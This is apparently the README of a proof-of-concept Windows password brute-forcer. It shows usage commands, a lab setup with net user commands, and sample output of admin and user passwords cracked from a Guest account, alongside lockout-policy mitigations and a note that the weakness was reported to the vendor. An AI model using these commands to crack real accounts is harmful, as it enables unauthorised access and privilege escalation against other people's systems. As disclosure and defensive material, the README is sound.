⚠️ This PoC was ported in pure PowerShell: https://github.com/DarkCoderSc/power-brute-logon

⚠️ Windows now enable account lockout by default (finally) which might now prevent this application to accomplish its mission: [ref](https://www.bleepingcomputer.com/news/microsoft/all-windows-versions-can-now-block-admin-brute-force-attacks/).

# Win Brute Logon (Proof Of Concept)

Release date: `2020-05-14`

Target: Windows XP to Latest Windows 10 Version (1909)

![Console](https://i.ibb.co/Cm5052S/screen.png)

Weakness location : `LogonUserA`, `LogonUserW`, `CreateProcessWithLogonA`, `CreateProcessWithLogonW`

## Usage

### Wordlist File

`WinBruteLogon.exe -u <username> -w <wordlist_file>`

### Stdin Wordlist

`type <wordlist_file> | WinBruteLogon.exe -u <username> -`

# ChangeLog

## 2020/05/23

- Now support stdin for wordlist.
- Few code optimization.

# Introduction

This PoC is more what I would call a serious weakness in Microsoft Windows Authentication mechanism than a vulnerability.

The biggest issue is related to the lack of privilege required to perform such actions.

Indeed, from a Guest account (The most limited account on Microsoft Windows), you can crack the password of any available local users.

Find out which users exists using command : `net user`

This PoC is using multithreading to speed up the process and support both 32 and 64bit.

# PoC Test Scenario (With a Guest Account)

Tested on Windows 10 

Install and configure a freshly updated Windows 10 virtual or physical machine.

In my case full Windows version was : `1909 (OS Build 18363.778)`

Log as administrator and lets create two different accounts : one administrator and one regular user. Both users are local.

/!\ Important notice: I used the Guest account for the demo but this PoC is not only limited to Guest account, it will work from any account / group (guest user / regular user / admin user etc...) 

## Create a new admin user

`net user darkcodersc /add`

`net user darkcodersc trousers` (trousers is the password)

`net localgroup administrators darkcodersc /add`

## Create a regular user

`net user HackMe /add`

`net user HackMe ozlq6qwm` (ozlq6qwm is the password)

## Create a new Guest account

`net user GuestUser /add`

`net localgroup users GuestUser /delete`

`net localgroup guests GuestUser /add`

## Get a Wordlist 

In my case both `trousers` and `ozlq6qwm` are in SecList : https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt

## Start the attack

Logoff from administrator account or restart your machine and log to the Guest account. 

Place the PoC executable anywhere you have access as Guest user.

Usage : `WinBruteLogon.exe -v -u <username> -w <wordlist_file>`

`-v` is optional, it design the verbose mode.

By default, domain name is the value designated by `%USERDOMAIN%` env var. You can specify a custom name with option `-d`

### Crack First User : `darkcodersc` (Administrator)

prompt(guest)>`WinBruteLogon.exe -v -u darkcodersc -w 10k-most-common.txt`

Wait few seconds to see the following result:

````
[ .. ] Load 10k-most-common.txt file in memory...
[DONE] 10002 passwords successfully loaded.
[INFO] 2 cores are available
[ .. ] Create 2 threads...
[INFO] New "TWorker" Thread created with id=2260, handle=364
[INFO] New "TWorker" Thread created with id=3712, handle=532
[DONE] Done.
[ OK ] Password for username=[darkcodersc] and domain=[DESKTOP-0885FP1] found = [trousers]
[ .. ] Finalize and close worker threads...
[INFO] "TWorkers"(id=2260, handle=364) Thread successfully terminated.
[INFO] "TWorkers"(id=3712, handle=532) Thread successfully terminated.
[DONE] Done.
[INFO] Ellapsed Time : 00:00:06
````

### Crack Second User : `HackMe` (Regular User)

prompt(guest)>`WinBruteLogon.exe -v -u HackMe -w 10k-most-common.txt`

Wait few seconds to see the following result:

````
[ .. ] Load 10k-most-common.txt file in memory...
[DONE] 10002 passwords successfully loaded.
[INFO] 2 cores are available
[ .. ] Create 2 threads...
[INFO] New "TWorker" Thread created with id=5748, handle=336
[INFO] New "TWorker" Thread created with id=4948, handle=140
[DONE] Done.
[ OK ] Password for username=[HackMe] and domain=[DESKTOP-0885FP1] found = [ozlq6qwm]
[ .. ] Finalize and close worker threads...
[INFO] "TWorkers"(id=5748, handle=336) Thread successfully terminated.
[INFO] "TWorkers"(id=4948, handle=140) Thread successfully terminated.
[DONE] Done.
[INFO] Ellapsed Time : 00:00:06
````

# Real world scenario

If you gain access to a low privileged user, you could crack the password of a more privileged user and escalate your privilege.

# Mitigation (General)

- Disable guest(s) account(s) if present.
- Application white-listing.
- Follow the guidelines to create and keep a password strong. Apply this to all users.

## Implement Security Lockout Policy (Not present by default)

Open `secpol.msc` then go to `Account Policies` > `Account Lockout Policy` and edit value `Account lockout threshold` with desired value from (1 to 999).

Value represent the number of possible attempt before getting locked.

/!\ LockDown Policy wont work on Administrator account. At this moment, best protection for Administrator account (if Enabled) is to setup a very complex password.

# Weakness Report

A report was sent to Microsoft Security Team.

They should at least implement by default account lockout. Actually it is not.
